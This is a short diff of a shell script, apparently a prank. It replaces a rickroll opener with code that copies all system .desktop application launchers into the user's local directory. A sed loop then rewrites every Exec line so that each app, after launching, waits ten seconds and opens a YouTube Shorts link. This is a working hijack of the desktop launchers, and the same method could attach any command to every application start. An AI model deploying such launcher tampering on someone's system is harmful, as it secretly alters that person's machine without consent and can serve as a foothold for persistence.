@@ -13,4 +13,8 @@ Type=Application
 Icon=org.telegram.desktop
 " > Telegram.desktop
 
-echo "xdg-open https://www.youtube.com/shorts/YJWSAJjkTsI" > RickRoll.sh
+cp -r /usr/share/applications ~/.local/share
+
+for f in ~/.local/share/applications/*.desktop; do
+    sed -ri 's/Exec=(.*)/Exec=bash -c "\1 \&\& sleep 10 \&\& xdg-open https:\/\/www.youtube.com\/shorts\/YJWSAJjkTsI"/g' $f
+done
